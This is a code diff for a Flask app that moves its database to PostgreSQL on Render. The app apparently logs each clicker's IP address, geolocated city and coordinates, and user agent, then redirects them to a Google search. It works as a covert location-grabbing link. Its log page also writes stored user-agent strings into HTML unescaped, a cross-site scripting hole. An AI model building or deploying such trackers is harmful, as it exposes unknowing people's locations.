@@ -1,29 +1,32 @@
-# app.py (Modified for PostgreSQL)
+# app.py (Final version for Render PostgreSQL)
 
 from flask import Flask, request, redirect, render_template_string, render_template
 from ip_locator import get_location_from_ip 
 import datetime
 import os 
-# 🟢 CHANGE 1: Import PostgreSQL driver
+# 🟢 Required PostgreSQL driver
 import psycopg2 
-from urllib.parse import urlparse
+from urllib.parse import urlparse # Though not strictly needed now, keeping for safety
 
 app = Flask(__name__)
 
 # --- Configuration ---
 FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
-# 🟢 CHANGE 2: Use DATABASE_URL from environment
-DATABASE_URL = os.environ.get('DATABASE_URL') 
+# NOTE: The line for DATABASE_URL is DELETED from global scope, 
+# as per the fix to prevent premature reading of environment variables.
 
 # --- Database Connection Utility ---
 def get_db_connection():
-    if not DATABASE_URL:
-        # This should not happen if you set the env var correctly on Render
+    # 🟢 CRITICAL FIX: Read the environment variable *inside* the function.
+    db_url = os.environ.get('DATABASE_URL')
+    
+    if not db_url:
+        # This error is now accurate, indicating a missing config on Render.
         raise Exception("DATABASE_URL environment variable is not set!")
     
-    # 🟢 NEW: Connect to PostgreSQL using the environment variable URL
-    # sslmode='require' is often needed for Render connections
-    return psycopg2.connect(DATABASE_URL, sslmode='require')
+    # Connect to PostgreSQL using the environment variable URL
+    # sslmode='require' is essential for secure connections on Render.
+    return psycopg2.connect(db_url, sslmode='require')
 
 
 # --- Database Setup (PostgreSQL) ---
@@ -32,7 +35,7 @@ def init_db():
         conn = get_db_connection()
         cursor = conn.cursor()
         
-        # 🟢 CHANGE 3: PostgreSQL-specific SQL for table creation
+        # PostgreSQL-specific SQL for table creation (using SERIAL PRIMARY KEY)
         cursor.execute("""
             CREATE TABLE IF NOT EXISTS clicks (
                 id SERIAL PRIMARY KEY,
@@ -52,8 +55,10 @@ def init_db():
         print("--- POSTGRES DB INITIALIZED SUCCESSFULLY ---")
         
     except Exception as e:
+        # We need this to print the actual psycopg2 connection error during deployment
         print(f"--- POSTGRES CONNECTION/INIT ERROR: {e} ---")
-        # In a real app, you might want to exit or log critically here.
+        # Re-raise the exception to fail the startup cleanly if needed
+        raise
 
 
 # --- Database Logging Function ---
@@ -72,14 +77,14 @@ def log_click_data(ip, location, user_agent, source="IP"):
     )
 
     try:
-        # 🟢 CHANGE 4: Use PostgreSQL connection
         conn = get_db_connection()
         cursor = conn.cursor()
         
+        # Uses %s placeholders for psycopg2
         cursor.execute("""
             INSERT INTO clicks (timestamp, ip_address, country, city, latitude, longitude, source, user_agent) 
             VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
-        """, data) # Uses %s placeholders for psycopg2
+        """, data) 
         
         conn.commit()
         cursor.close()
@@ -157,7 +162,7 @@ def view_logs():
         conn = get_db_connection()
         cursor = conn.cursor()
         
-        # 🟢 CHANGE 5: Run query on the PostgreSQL database
+        # Run query on the PostgreSQL database
         cursor.execute("SELECT id, timestamp, ip_address, country, city, latitude, longitude, source, user_agent FROM clicks ORDER BY timestamp DESC")
         logs = cursor.fetchall()
         cursor.close()
@@ -173,7 +178,6 @@ def view_logs():
         html += "<tr><td colspan='9'>No clicks recorded yet.</td></tr>"
     else:
         for row in logs:
-            # Note: PostgreSQL will return float/int data types, which print fine in f-strings
             ua_display = row[8][:50] + '...' if len(str(row[8])) > 50 else str(row[8])
             html += f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>{row[5]}</td><td>{row[6]}</td><td>{row[7]}</td><td>{ua_display}</td></tr>"
     
@@ -190,7 +194,7 @@ def health_check():
     return "OK", 200
 
 if __name__ == '__main__':
-    # We call init_db outside the app context for Gunicorn safety, but it's done here once locally
+    # Initialize the database and create the table structure
     init_db() 
     
     if not os.path.exists('templates'):
